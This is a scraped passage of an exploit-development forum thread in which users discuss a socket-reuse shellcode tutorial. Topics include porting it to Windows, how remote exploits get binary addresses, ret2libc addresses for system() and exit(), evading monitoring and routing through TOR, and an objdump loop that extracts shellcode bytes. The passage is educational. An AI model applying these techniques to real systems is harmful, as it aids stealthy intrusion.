<div class="onebox-metadata">
</div>
<div style="clear: both"></div>
</aside>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="3" />
<span class="post-likes">3 Likes</span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="1" />
</div>
</div>
<div id="post_7" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/Joe_Schmoe"><span itemprop="name">Joe_Schmoe</span></a>
</span>
<link itemprop="mainEntityOfPage" href="1440.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2017-01-07T00:08:45Z" class="post-time">
January 7, 2017, 12:08am
</time>
<meta itemprop="dateModified" content="2017-01-07T00:08:45Z">
<span itemprop="position">7</span>
</span>
</div>
<div class="post" itemprop="text">
<p>Clever. Is something like that possible on windows?</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="1" />
<span class="post-likes">1 Like</span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="1" />
</div>
</div>
<div id="post_8" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/0x00pf"><span itemprop="name">0x00pf</span></a>
(pico)
</span>
<link itemprop="mainEntityOfPage" href="1440.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2017-01-07T00:37:57Z" class="post-time">
January 7, 2017, 12:37am
</time>
<meta itemprop="dateModified" content="2017-01-07T00:37:57Z">
<span itemprop="position">8</span>
</span>
</div>
<div class="post" itemprop="text">
<p>AFAIK there is no direct equivalence to this on Windows. I’m pretty sure it should be possible to reuse the existing connection but I bet the process would probably be pretty different… but I do not know how. Maybe some of the windows guy can provide some details.</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="0" />
<span class="post-likes"></span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="0" />
</div>
</div>
<div id="post_9" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/IoTh1nkN0t"><span itemprop="name">IoTh1nkN0t</span></a>
</span>
<link itemprop="mainEntityOfPage" href="1440.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2017-01-07T02:32:11Z" class="post-time">
January 7, 2017, 2:32am
</time>
<meta itemprop="dateModified" content="2017-01-07T02:32:11Z">
<span itemprop="position">9</span>
</span>
</div>
<div class="post" itemprop="text">
<p>Woah, this is so clever! Awesome tutorial once again, might use this for the Ret2libc tut ^^</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="2" />
<span class="post-likes">2 Likes</span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="0" />
</div>
</div>
<div id="post_10" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/pry0cc"><span itemprop="name">pry0cc</span></a>
(Leader &amp; Offsec Engineer &amp; Forum Daddy)
</span>
<link itemprop="mainEntityOfPage" href="1440.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2017-01-07T11:08:17Z" class="post-time">
January 7, 2017, 11:08am
</time>
<meta itemprop="dateModified" content="2017-01-07T11:08:17Z">
<span itemprop="position">10</span>
</span>
</div>
<div class="post" itemprop="text">
<p>Thank you <span class="mention">@py</span>! This is a very good read. I do have some questions though.</p>
<pre><code class="lang-python">system = 0x8048380
exit = 0x80483a0
system_arg = 0x80485b5 
</code></pre>
<p>He obtains these addresses by doing a hex dump of the binary. The only way he could do this would be if he already had shell access? This would never work for a remote exploit? Or would it?</p>
<p>I’m really interested in this but I need to grasp memory concepts a little more. May give your dynamic linker post another read through, I could do with going through Pico’s wannabe tutorials as well just to reinforce the basics.</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="1" />
<span class="post-likes">1 Like</span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="1" />
</div>
</div>
<div id="post_11" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/_py"><span itemprop="name">_py</span></a>
</span>
<link itemprop="mainEntityOfPage" href="1440.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2017-01-07T11:38:08Z" class="post-time">
January 7, 2017, 11:38am
</time>
<meta itemprop="dateModified" content="2017-01-07T12:03:30Z">
<span itemprop="position">11</span>
</span>
</div>
<div class="post" itemprop="text">
<p><a class="mention" href="https://0x00sec.org/u/pry0cc">@pry0cc</a>: The link is indeed not aimed at a scenario like the one <a class="mention" href="https://0x00sec.org/u/0x00pf">@0x00pf</a> presented. I linked it to you so you can get a general idea on how some of the modern exploit mitigations can be bypassed. The funny thing is that IoT/embedded devices barely manage to implement any of the aforementioned mitigations.</p>
<p>As for the dynamic linking stuff, I’ll try to write a few more posts on it from an exploit dev perspective once my exams are over.</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="3" />
<span class="post-likes">3 Likes</span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="0" />
</div>
</div>
<div id="post_12" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/0x00pf"><span itemprop="name">0x00pf</span></a>
(pico)
</span>
<link itemprop="mainEntityOfPage" href="1440.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2017-01-07T13:18:23Z" class="post-time">
January 7, 2017, 1:18pm
</time>
<meta itemprop="dateModified" content="2017-01-07T13:18:23Z">
<span itemprop="position">12</span>
</span>
</div>
<div class="post" itemprop="text">
<aside class="quote group-VIP" data-username="pry0cc" data-post="10" data-topic="1440">
<div class="title">
<div class="quote-controls"></div>
<img alt width="20" height="20" src="../../user_avatar/0x00sec.org/pry0cc/40/6_2.png" class="avatar"> pry0cc:</div>
<blockquote>
<p>He obtains these addresses by doing a hex dump of the binary. The only way he could do this would be if he already had shell access? This would never work for a remote exploit? Or would it?</p>
</blockquote>
</aside>
<p>Well, you need to have a local version of the program to exploit. I do not think you can write a exploit against a service without having access to the service itself and some details of the system. You have to get the program somehow (using some other flaw or getting it from other server with lower security) or use your recon phase to gather enough information (OS version, service version, compiler, etc…) to rebuild a “close-enough” version of the service to develop the exploit whenever the service is publicly available (open source project for instance).</p>
<p>I’m not 100% sure but I do not think you can develop a remote exploit without some kind of access to the binary. If anybody know about any technique to achieve that I’m interested in knowing more <img src="../../images/emoji/twitter/slight_smile.png%3Fv=9" title=":slight_smile:" class="emoji" alt=":slight_smile:"></p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="4" />
<span class="post-likes">4 Likes</span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="1" />
</div>
<div class="crawler-linkback-list" itemscope itemtype="http://schema.org/ItemList">
<div itemprop="itemListElement" itemscope itemtype="http://schema.org/ListItem">
<a itemprop="url" href="../blindly-hacking-remote-services/1501.html">Blindly Hacking Remote Services</a>
<meta itemprop="position" content="1">
</div>
</div>
</div>
<div id="post_13" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/pry0cc"><span itemprop="name">pry0cc</span></a>
(Leader &amp; Offsec Engineer &amp; Forum Daddy)
</span>
<link itemprop="mainEntityOfPage" href="1440.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2017-01-07T13:44:21Z" class="post-time">
January 7, 2017, 1:44pm
</time>
<meta itemprop="dateModified" content="2017-01-07T13:44:21Z">
<span itemprop="position">13</span>
</span>
</div>
<div class="post" itemprop="text">
<p>Ohhhhhhhh! I didn’t realise the addresses were the same in every binary. That’s dope. Okay thanks.</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="1" />
<span class="post-likes">1 Like</span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="1" />
</div>
</div>
<div id="post_14" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/0x00pf"><span itemprop="name">0x00pf</span></a>
(pico)
</span>
<link itemprop="mainEntityOfPage" href="1440.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2017-01-07T13:54:36Z" class="post-time">
January 7, 2017, 1:54pm
</time>
<meta itemprop="dateModified" content="2017-01-07T13:54:36Z">
<span itemprop="position">14</span>
</span>
</div>
<div class="post" itemprop="text">
<p>Your sentence is a bit stronger that what I suggested.</p>
<p>I meant that, as far as the system configuration is the same (OS version, libc version, compiler version…) in two different machines. Compiling the same source will produce the same binary. I do not know if what you said is true… never checked it.</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="2" />
<span class="post-likes">2 Likes</span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="1" />
</div>
</div>
<div id="post_15" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/pry0cc"><span itemprop="name">pry0cc</span></a>
(Leader &amp; Offsec Engineer &amp; Forum Daddy)
</span>
<link itemprop="mainEntityOfPage" href="1440.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2017-01-07T13:56:25Z" class="post-time">
January 7, 2017, 1:56pm
</time>
<meta itemprop="dateModified" content="2017-01-07T13:56:25Z">
<span itemprop="position">15</span>
</span>
</div>
<div class="post" itemprop="text">
<p>Right. So if you could obtain the same binary as them, then it will be the same?</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="1" />
<span class="post-likes">1 Like</span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="1" />
</div>
</div>
<div id="post_16" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/0x00pf"><span itemprop="name">0x00pf</span></a>
(pico)
</span>
<link itemprop="mainEntityOfPage" href="1440.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2017-01-07T14:05:31Z" class="post-time">
January 7, 2017, 2:05pm
</time>
<meta itemprop="dateModified" content="2017-01-07T14:05:31Z">
<span itemprop="position">16</span>
</span>
</div>
<div class="post" itemprop="text">
<p>I would say so for most of the cases. Somebody can rebuild the binary with special linker flags that mesh up the memory.</p>
<p>Check the last section to see an example on how to relocate the text segment via linker flags. In that case you also need the Makefile, however I do not believe that happens very often.</p>
<aside class="quote quote-modified" data-post="1" data-topic="1164">
<div class="title">
<div class="quote-controls"></div>
<img alt width="20" height="20" src="../../user_avatar/0x00sec.org/0x00pf/40/199_2.png" class="avatar">
<a href="../programming-for-wannabes-part-ii/1164.html">Programming for Wannabes. Part II</a> <a class="badge-wrapper  bullet" href="../../c/programming/61.html"><span class="badge-category-bg" style="background-color: #92278F;"></span><span style data-drop-close="true" class="badge-category clear-badge">Programming</span></a>
</div>
<blockquote>
Glad to see you have come back to this humble course. Hope you are eager to get a lot more stuff to digest. Grab some coffee and relax.
I have been claiming that this course is going to be different to all those that you find over the Internet. Right now, I should introduce a whole bunch of boring things (numeric representation, addressing modes, instructions groups,…) and guess what?.. I won’t do that.
In order to avoid going through all that boring stuff and to try to follow a learn-by-examp…
</blockquote>
</aside>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="2" />
<span class="post-likes">2 Likes</span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="0" />
</div>
</div>
<div id="post_17" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/zadyree"><span itemprop="name">zadyree</span></a>
(Zadyree)
</span>
<link itemprop="mainEntityOfPage" href="1440.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2017-01-09T19:23:51Z" class="post-time">
January 9, 2017, 7:23pm
</time>
<meta itemprop="dateModified" content="2017-01-09T19:23:51Z">
<span itemprop="position">17</span>
</span>
</div>
<div class="post" itemprop="text">
<p>Hi there. When I wrote this trick I had in mind it was not <em>theorically</em> valid, which led me not to propose an implementation for Metasploit for example. Hence, as an exploit coding fan, I suggest to rather use this shellcode for challenges and ROP your way for concrete and accurate socket-reuse exploits.</p>
<p>Also, if I may add something, the interests of such attacks are 1/ obviously that it’s stealthier regarding potential monitoring, and 2/ that as it uses an established channel initiated as in a classic client-server case, so coupling it with TOR seems easy as hell <img src="../../images/emoji/twitter/wink.png%3Fv=9" title=":wink:" class="emoji" alt=":wink:"></p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="8" />
<span class="post-likes">8 Likes</span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="1" />
</div>
</div>
<div id="post_18" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/0x00pf"><span itemprop="name">0x00pf</span></a>
(pico)
</span>
<link itemprop="mainEntityOfPage" href="1440.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2017-01-09T19:34:40Z" class="post-time">
January 9, 2017, 7:34pm
</time>
<meta itemprop="dateModified" content="2017-01-09T19:34:40Z">
<span itemprop="position">18</span>
</span>
</div>
<div class="post" itemprop="text">
<p>Hi <a class="mention" href="https://0x00sec.org/u/zadyree">@zadyree</a>,</p>
<p>Thanks for passing by our site and for that great trick. I was really amaze when I read your code in shell-storm!. Actually it took me a while to realise what it was doing <img src="../../images/emoji/twitter/sweat.png%3Fv=9" title=":sweat:" class="emoji" alt=":sweat:"></p>
<p>Haven’t thought about TOR. That is a very good point.</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="6" />
<span class="post-likes">6 Likes</span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="0" />
</div>
</div>
<div id="post_19" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/pry0cc"><span itemprop="name">pry0cc</span></a>
(Leader &amp; Offsec Engineer &amp; Forum Daddy)
</span>
<link itemprop="mainEntityOfPage" href="1440.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2017-01-16T22:51:47Z" class="post-time">
January 16, 2017, 10:51pm
</time>
<meta itemprop="dateModified" content="2017-01-16T22:51:47Z">
<span itemprop="position">19</span>
</span>
</div>
<div class="post" itemprop="text">
<p>Hi <a class="mention" href="https://0x00sec.org/u/0x00pf">@0x00pf</a>!</p>
<p>I think I found a small typo.</p>
<p>I found your shell command to generate shellcode didn’t work, it just produced a tonne of binary jibberish, this is the revised version that worked for me (I just escaped the first \ on the echo -n).</p>
<pre><code class="lang-auto">for i in $(objdump -d rsh.o -M intel |grep "^ " |cut -f2); do echo -n '\\x'$i; done;echo
</code></pre>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="0" />
<span class="post-likes"></span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="1" />
</div>
</div>
<div id="post_20" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/0x00pf"><span itemprop="name">0x00pf</span></a>
(pico)
</span>
<link itemprop="mainEntityOfPage" href="1440.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2017-01-16T23:08:43Z" class="post-time">
January 16, 2017, 11:08pm
</time>
<meta itemprop="dateModified" content="2017-01-16T23:08:43Z">
<span itemprop="position">20</span>
</span>
</div>
<div class="post" itemprop="text">
<p>Hi <a class="mention" href="https://0x00sec.org/u/pry0cc">@pry0cc</a></p>
<p>It may be due to your shell. According to man page for echo</p>
<pre><code>    (...)
    \xHH   byte with hexadecimal value HH (1 to 2 digits)

   NOTE: your shell may have its own version of echo, which usually supersedes the version described here.  Please refer to your shell's docu‐
   mentation for details about the options it supports.
   (...)
</code></pre>
<p>In may system with bash I get two slashes with your version. But it is very good you spotted as other people may have had that problem as well</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="4" />
<span class="post-likes">4 Likes</span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="1" />
</div>
</div>
</div>
<div role="navigation" itemscope itemtype="http://schema.org/SiteNavigationElement" class="topic-body crawler-post">
<span itemprop="name"><b><a rel="next" itemprop="url" href="1440%3Fpage=2.html">next page →</a></b></span>
</div>
</div>
<footer class="container wrap">
<nav class="crawler-nav">
<ul>
<li itemscope itemtype="http://schema.org/SiteNavigationElement">
<span itemprop="name">
<a href="../../index.html" itemprop="url">Home </a>
</span>
</li>
<li itemscope itemtype="http://schema.org/SiteNavigationElement">
<span itemprop="name">
<a href="../../categories.html" itemprop="url">Categories </a>
</span>
</li>
<li itemscope itemtype="http://schema.org/SiteNavigationElement">
<span itemprop="name">
<a href="https://0x00sec.org/guidelines" itemprop="url">FAQ/Guidelines </a>
</span>
</li>
<li itemscope itemtype="http://schema.org/SiteNavigationElement">
<span itemprop="name">
<a href="../../tos.html" itemprop="url">Terms of Service </a>
</span>
</li>
<li itemscope itemtype="http://schema.org/SiteNavigationElement">
<span itemprop="name">
<a href="../../privacy.html" itemprop="url">Privacy Policy </a>
</span>
</li>
</ul>
</nav>
<p class="powered-by-link">Powered by <a href="https://www.discourse.org">Discourse</a>, best viewed with JavaScript enabled</p>
</footer>
<script src="https://instant.page/3.0.0" type="module" defer integrity="sha384-OeDn4XE77tdHo8pGtE1apMPmAipjoxUQ++eeJa6EtJCfHlvijigWiJpD7VDPWXV1"></script>
</body>
</html>
